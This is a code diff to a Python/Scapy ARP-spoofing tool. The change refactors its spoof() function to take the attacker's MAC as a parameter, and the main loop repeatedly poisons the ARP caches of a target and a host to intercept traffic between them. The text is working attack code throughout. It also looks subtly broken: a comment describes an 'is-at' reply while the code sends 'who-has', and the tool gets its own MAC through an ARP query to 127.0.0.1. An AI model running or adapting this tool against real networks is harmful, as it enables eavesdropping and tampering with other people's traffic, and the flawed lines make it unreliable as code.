@@ -78,7 +78,7 @@ def get_mac(ip):
     if ans:
         return ans[0][1].src
 
-def spoof(target_ip, host_ip):
+def spoof(target_ip, host_ip, my_mac):
     """Spoofs `target_ip` saying that we are `host_ip`
 
     Args:
@@ -88,7 +88,7 @@ def spoof(target_ip, host_ip):
     
     # craft the arp 'is-at' operation packet, in other words: an ARP response
     # 'hwsrc' is not specified as by default it is our MAC address
-    arp_response = Ether() / ARP(op='who-has', hwsrc=get_mac("127.0.0.1"), pdst=target_ip, psrc=host_ip)
+    arp_response = Ether() / ARP(op='who-has', hwsrc=my_mac, pdst=target_ip, psrc=host_ip)
     sendp(arp_response, verbose=0)
     print(".", end=" ", flush=True)
 
@@ -175,13 +175,14 @@ def main():
             host = args[1]
 
             print("[!] Sending spoofed packet to target")
+            my_mac = get_mac("127.0.0.1")
 
             try:
                 while True:
                     # telling the `target` that we are the `host`
-                    spoof(target, host)
+                    spoof(target, host, my_mac)
                     # telling the `host` that we are the `target`
-                    spoof(host, target)
+                    spoof(host, target, my_mac)
                     time.sleep(1)
             except KeyboardInterrupt:
                 print("\n[!] Detected CTRL+C! Restoring the network, please wait...")
